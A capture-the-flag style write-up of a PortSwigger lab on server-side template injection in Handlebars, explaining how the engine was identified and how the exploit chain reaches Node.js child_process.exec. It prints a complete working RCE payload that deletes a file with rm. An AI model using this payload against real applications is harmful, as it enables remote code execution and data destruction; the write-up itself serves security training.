# Server-Side Template Injection in an Unknown Language — Handlebars


> **PortSwigger Web Security Academy Lab**

> **Difficulty:** Practitioner

> **Category:** Server-Side Template Injection (SSTI)

> **Status:** Solved



## Lab Objective




Identify the template engine, find a documented exploit for it, achieve arbitrary code execution, and delete:



```text

/home/carlos/morale.txt

```



---



## 1. Finding the Injection Point



The application uses a `message` parameter:



```http

GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock

```


The `message` parameter is reflected and processed by the server.



To test for SSTI, inject a template expression:



```text

{{7*7}}

```


Instead of returning `49`, the application returned an **Internal Server Error**.



---



## 2. Identifying the Template Engine



The error message revealed:



```text

handlebars/dist/cjs/handlebars/
```



and:



```text

Handlebars Environment

```



Therefore, the template engine is:



```text

Handlebars

```



### Key lesson



Error messages and stack traces can reveal the underlying template engine.



A useful workflow is:



```text

SSTI suspected

      ↓

Inject template syntax

      ↓

Observe response/error

      ↓

Identify template engine

```



---



## 3. Finding a Documented Exploit



Once the engine was identified as **Handlebars**, instead of guessing an RCE payload, search for a documented 
exploit:



```text

Handlebars server-side template injection

```



PortSwigger's solution for this lab recommends finding a documented Handlebars SSTI exploit and adapting it to 
execute the required command.



---



## 4. Understanding the Exploit Chain


The exploit is complicated because Handlebars does not directly provide access to Node.js's `exec()` function.



The overall chain is:



```text

Handlebars

    ↓

JavaScript objects / methods


    ↓

constructor

    ↓

Function construction

    ↓

JavaScript execution

    ↓

require()

    ↓

child_process

    ↓

exec()

    ↓

Operating-system command

```



The important concept is **not memorizing the payload**.



The important concept is understanding how the exploit escapes the template context and reaches JavaScript 
functionality.



---



## 5. Accessing `constructor`



One important part of the exploit is:



```handlebars

{{this.push (lookup string.sub "constructor")}}

```



The purpose is to obtain the `constructor` associated with a JavaScript function.


This helps the exploit move from:



```text

Handlebars

```



to:



```text

JavaScript Function

```



which can then be used to execute JavaScript code.



---



## 6. `push()` and `pop()`



The exploit repeatedly uses:



```handlebars

{{this.push ...}}

```



and:



```handlebars

{{this.pop}}

```




These operations manipulate arrays and help construct the required object/method chain.



Conceptually:



```text


Array

 ↓

pop()

 ↓

push(value)

 ↓

pop()
```



These methods are not the vulnerability themselves. They are used as building blocks by the documented exploit.



---



## 7. Reaching JavaScript Execution



The exploit eventually constructs JavaScript similar to:



```javascript

return require('child_process').exec('...');

```


The important transition is:



```text

Template evaluation


        ↓

JavaScript Function

        ↓

JavaScript code execution

```



---



## 8. Node.js `require()`



The application is running on Node.js.



The exploit uses:



```javascript

require('child_process')

```



to load Node.js's `child_process` module.



Then:



```javascript

exec(...)

```



can be used to execute a system command.



The resulting chain is:



```text

require()
   ↓

child_process

   ↓

exec()

   ↓

OS command

```



---



## 9. Modifying the Command



The lab requires deleting:



```text

/home/carlos/morale.txt

```



Therefore, the command used by the exploit is:





```bash

rm /home/carlos/morale.txt

```


The relevant JavaScript becomes:


```javascript
require('child_process').exec(

    'rm /home/carlos/morale.txt'

);

```



---



## 10. Exploit Payload



The documented Handlebars exploit was adapted to execute the required command:



```text

wrtz{{#with "s" as |string|}}

{{#with "e"}}

{{#with split as |conslist|}}

{{this.pop}}

{{this.push (lookup string.sub "constructor")}}

{{this.pop}}

{{#with string.split as |codelist|}}

{{this.pop}}

{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}

{{this.pop}}

{{#each conslist}}

{{#with (string.sub.apply 0 codelist)}}

{{this}}

{{/with}}

{{/each}}

{{/with}}

{{/with}}

{{/with}}

```



When sending the payload through the URL, it should be **URL-encoded** appropriately.



---



## 11. How to Approach Similar SSTI Labs



Don't memorize individual payloads. Use this methodology:



### Step 1 — Find the injection point



Look for parameters whose values are reflected or rendered by the application.



### Step 2 — Test for SSTI



Try template expressions such as:



```text

{{7*7}}

```



### Step 3 — Identify the engine



Look at:



* Response behavior

* Error messages

* Stack traces

* Framework-specific syntax




### Step 4 — Search for documented exploits



For example:



```text

Handlebars server-side template injection

```



### Step 5 — Understand the exploit



Determine how it moves from:



```text

Template

   ↓

Runtime

   ↓


Code execution

```



### Step 6 — Adapt the final command



Change only the command required by the lab objective.



---



## Key Takeaways



```text

SSTI

 ↓

Identify the template engine

 ↓

Search for a documented exploit

 ↓

Understand the exploitation chain

 ↓

Adapt the payload

 ↓

Achieve code execution

```



For this lab:


```text

SSTI

 ↓

Handlebars

 ↓

constructor

 ↓

JavaScript Function

 ↓

require()

 ↓

child_process

 ↓

exec()

 ↓

rm /home/carlos/morale.txt


 ↓

Lab solved

```



## References



* PortSwigger — [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)

* PortSwigger — [Lab: SSTI in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit?utm_source=chatgpt.com)

* Handlebars — [Official Documentation](https://handlebarsjs.com/guide/?utm_source=chatgpt.com)
